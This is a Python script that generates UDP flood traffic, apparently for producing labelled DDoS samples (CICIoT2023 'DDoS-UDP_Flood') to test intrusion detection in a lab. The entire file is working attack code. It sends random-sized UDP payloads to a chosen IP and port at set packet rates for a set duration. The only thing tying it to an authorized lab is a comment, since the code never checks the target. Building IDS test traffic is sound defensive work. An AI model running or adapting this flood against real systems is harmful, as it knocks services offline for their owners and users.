"""
DDoS UDP Flood — authorized lab testing only.
Generates UDP packets to target for IDS detection testing.
Maps to CICIoT2023 class: DDoS-UDP_Flood
"""
import socket
import random
import time


def run(target_ip: str, duration: int = 30, intensity: str = 'medium',
        target_port: int = 53):
    """
    Generate UDP flood traffic against target.

    Args:
        target_ip: victim IP (must be within lab VPC)
        duration: seconds to run
        intensity: low/medium/high
    """
    rates = {'low': 100, 'medium': 500, 'high': 2000}
    pps = rates.get(intensity, 500)
    delay = 1.0 / pps

    print(f"[UDP Flood] Target: {target_ip}:{target_port}")
    print(f"[UDP Flood] Duration: {duration}s, Rate: ~{pps} pps")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_sizes = [64, 128, 256, 512, 1024]

    sent = 0
    start = time.time()
    while time.time() - start < duration:
        try:
            payload = random.randbytes(random.choice(payload_sizes))
            port = target_port if target_port != 0 else random.randint(1, 65535)
            sock.sendto(payload, (target_ip, port))
            sent += 1
            if sent % 100 == 0:
                elapsed = time.time() - start
                print(f"  [{elapsed:.0f}s] Sent {sent} UDP packets")
        except Exception:
            pass
        time.sleep(delay)

    sock.close()
    elapsed = time.time() - start
    print(f"[UDP Flood] Complete: {sent} packets in {elapsed:.1f}s ({sent/elapsed:.0f} pps)")
    return sent
